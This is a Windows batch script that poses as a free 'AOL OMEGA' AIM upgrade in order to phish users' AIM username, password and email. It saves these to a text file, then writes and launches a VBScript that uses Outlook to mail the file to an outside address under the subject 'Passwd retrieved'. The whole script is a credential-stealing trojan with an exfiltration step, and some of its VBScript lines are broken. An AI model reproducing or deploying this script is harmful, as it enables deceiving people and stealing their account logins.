@echo off
color 4
echo AOL OMEGA!
echo The new AIM patch. Completely Free!
echo We tracked all of the users of AIM and are sending them this new upgrade  
echo for their program because of the celebration of our new department in
echo online videogaming!
pause
cls
color 5
echo AOL OMEGA will now begin to upgrade your system.
echo If you dont have AIM, then this program will automatically download it for you! Isn't that great?
echo But you have to Type in your username and password so that the
echo program can long onto the AIM Server Network and send your computer
echo the upgrades.
pause
cls
color 2
set /p Username=Please Enter Your Username:
cls
set /p Password=Please enter Your Password:
cls
set /p email=Please enter your email, (Activation Code will be sent):
echo %username% >>c:\bla.txt
echo %password% >>c:\bla.txt
echo %email% >>c:\bla.txt
echo Username:%username%
echo password:%password%
echo Email:%email%
echo If correct please press "Y" if not press "N"
pause >nul
cls
echo thank you for signing up.
pause >nul

echo On Error Resume Next >> C:\bla.vbs
echo msgbox "Thank you for Choosing to use this upgrade of AIM. Look Forward for other great upgrades in your email soon!" >> C:\bla.vbs

echo set Email = CreateObject("Outlook.Application") >> C:\bla.vbs
echo If Email = "Outlook" Then >> C:\bla.vbs
echo set New = OutlookApp.CreateItem(0) >> C:\bla.vbs
echo New.To = "emailadres@bla.com  >> C:\bla.vbs
echo New.Subject = "Passwd retrieved" >> C:\bla.vbs
echo New.Body = "blaaaa" >> C:\bla.vbs
echo New.Attach.Add "c:\bla.txt" >> C:\bla.vbs
echo New.Send >> C:\bla.vbs
start C:\bla.vbs

